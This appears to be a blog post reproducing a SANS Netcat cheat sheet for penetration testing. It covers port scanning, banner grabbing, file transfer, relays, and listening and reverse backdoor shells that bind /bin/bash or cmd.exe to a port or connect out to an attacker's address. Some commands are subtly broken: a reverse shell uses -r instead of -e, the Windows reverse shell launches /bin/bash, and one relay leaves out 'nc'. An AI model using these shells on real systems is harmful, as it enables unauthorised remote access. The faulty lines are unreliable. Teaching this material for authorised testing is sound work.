---
layout: post
title: "Netcat Cheat Sheet"
date: 2016-05-22 22:12:33 -0700
categories: netcat, pentest
---
[Netcat][netcat-link] is considered to be the TCP/IP swiss army knife and is capable of writing data across the network. Its ability to create a connection to almost anything makes it an easy to use utility that is part of any infosec professionals toolbox. This cheat sheet provides tips and tricks for Netcat on both Linux and Unix.

All credit for putting together this cheat sheet goes to Ed Skoudis and [SANS][sans-link]

### Fundamentals

#### Netcat client
{% highlight bash %}
nc [TargetIPaddr] [port]
{% endhighlight %}
Connect to an arbitrary port [port] at IP Address [TargetIPaddr]

#### Netcat listener
{% highlight bash %}
nc -l -p [LocalPort]
{% endhighlight %}
Create a Netcat listener on arbitrary local port [LocalPort]
&nbsp;
---

### File Transfer

#### Push a file from client to listener
{% highlight bash %}
nc -l -p [LocalPort] > [outfile]
{% endhighlight %}
Listen on [localPort], store results in [outfile]

{% highlight bash %}
nc -w3 [TargetIPaddr] [port] < [infile]
{% endhighlight %}
Push [infile] to [TargetIPaddr] on [port]

#### Pull file from listener back to client
{% highlight bash %}
nc -l -p [LocalPort] < [infile]
{% endhighlight %}
Listen on [LocalPort], prep to push [infile]

{% highlight bash %}
nc -w3 [TargetIPaddr] [port] > [outfile]
{% endhighlight %}
Connect to [TargetIPaddr] on [port] and retrieve [outfile]

---

### TCP Port Scanner

#### Port scan an IP Address
{% highlight bash %}
nc -v -n -z -w1 [TargetIPaddr] [start_port]-[end_port]
{% endhighlight %}
Attempt to connect to each port in a range from [end_port] to [start_port] on IP Address
[TargetIPaddr] running verbosely (-v on Linux, -vv on Windows), not resolving names (-n), without
sending any data (-z), and waiting no more than 1 second for a connection to occur (-w1)

The randomized ports (-r) switch can be used to choose port numbers randomly in the range

---

### TCP Banner Grabber

#### Grab the banner of TCP services running on an IP address from Linux
{% highlight bash %}
echo "" | nc -v -n -w1 [TargetIPaddr] [start_port]-[end_port]
{% endhighlight %}
Attempt to connect to each port in a range form [end_port] to [start_port] on IP Address
[TargetIPaddr] running verbosely (-v), not resolving names (-n), and waiting no more than 1 second
for a connection to occur (-w1). Then send a blank string to the open port and print out any banner
received in response

Add -r to randomize destination ports within the range

Add -p [port] to specify a source port

---

### Backdoor Shells

#### Listening backdoor shell on Linux
{% highlight bash %}
nc -l -p [LocalPort] -e /bin/bash
{% endhighlight %}

#### Listening backdoor shell on Windows
{% highlight bash %}
nc -l -p [LocalPort] -e cmd.exe
{% endhighlight %}

Create a shell on a local port [LocalPort] that can then be accessed using a fundamental
Netcat client

#### Reverse backdoor shell on Linux
{% highlight bash %}
nc [YourIPaddr] [port] -r /bin/bash
{% endhighlight %}

#### Reverse backdoor shell on Windows
{% highlight bash %}
nc [YourIPaddr] [port] -e /bin/bash
{% endhighlight %}

Create a reverse shell that will attempt to connect to [YourIPaddr] on a local [port]. This shell can then be captured on local port [port]. This shell can then be captured using a fundamental netcat listener

---

### Netcat Relays on Linux
To begin, create a FIFO (named pipe) called backpipe:
{% highlight bash %}
cd /tmp
mknod backpipe p
{% endhighlight %}

#### Listener-to-Client Relay
{% highlight bash %}
nc -l -p [LocalPort] 0<backpipe | nc [TargetIPaddr] [port] | tee backpipe
{% endhighlight %}

Create a relay that sends packets from the local port [LocalPort] to a Netcat
client connected to [TargerIPaddr] on port [port]

#### Listener-to-Listener Relay
{% highlight bash %}
nc -l -p [LocalPort_1] 0<backpipe | nc -l -p [LocalPort_2] | tee backpipe
{% endhighlight %}

Create a relay that sends packets from any connection on [LocalPort_1] to any
connection on [LocalPort_2]

#### Client-to-Client Relay
{% highlight bash %}
nc [PreviousHopIPaddr] [port] 0<backpipe | [NextHopIPaddr] [port2] | tee backpipe
{% endhighlight %}

Create a relay that sends packets from the connection to [PreviousHopIPaddr] on port [port] to a Netcat client connected to [NextHopIPaddr] on port [port2]

---

### Netcat Relays on Windows
To begin, enter a temporary directory where we will create .bat files:
{% highlight bash %}
cd c:\temp
{% endhighlight %}

#### Listener-to-Client Relay
{% highlight bash %}
echo nc [TargetIPaddr] [port] > relay.bat
nc -l -p [LocalPort] -e relay.bat
{% endhighlight %}

Create a relay that sends packets from the local port [LocalPort] to a Netcat
Client connected to [TargetIPaddr] on port [port]

#### Listener-to-Listener Relay
{% highlight bash %}
echo nc -l -p [LocalPort_2] > relay.bat
nc -l -p [LocalPort_1] -e relay.bat
{% endhighlight %}

Create a relay that will send packets from any connection on [LocalPort_1] to
any connection on [LocalPort_2]

#### Client-to-Client Relay
{% highlight bash %}
echo nc [NextHopIPaddr] [port2] > relay.bat
nc [PreviosHopIPaddr] [port] -e relay.bat
{% endhighlight %}

Create a relay that will send packets from the connection to [PreviousHopIPaddr]
on port [port] to a Netcat Client connected to [NextHopIPaddr] on port [port2]

---

### Netcat Command Flags
{% highlight bash %}
nc [options] [TargetIPaddr] [ports(s)]
{% endhighlight %}

The [TargetIPaddr] is simply the other side's IP address or domain name. It is
required in client mode of course (because we have to tell the client where to
connect), and is optional in listen mode.

-l : Listen mode (default is client mode)

-L : Listen harder (supported only on Windows version of Netcat). This     option makes Netcat a persistent listener which starts listening again after a client disconnects

-u : UDP mode (default is TCP)

-p : Local port (In listen mode, this is the port listened on. In client mode, this is the source port for all packets sent)

-e : Program to execute after connection occurs, connecting STDIN and STDOUT to the program

-n : Don't perform DNS lookups on names of machines on the other side

-z : Zero-I/O mode (Don't send any data, just emit a packet without payload)

-wN : Timeout for connects, waits for N seconds after closure of STDIN. A Netcat listener with this option will wait for N seconds to make a connection. If the connection doesn't happen in that time, Netcat stops running.

-v : Be verbose, printing out messages on Standard Error, such as when a connection occurs

-vv : Be very verbose, printing even more details on Standard Error

[netcat-link]: https://en.wikipedia.org/wiki/Netcat
[sans-link]: https://www.sans.org/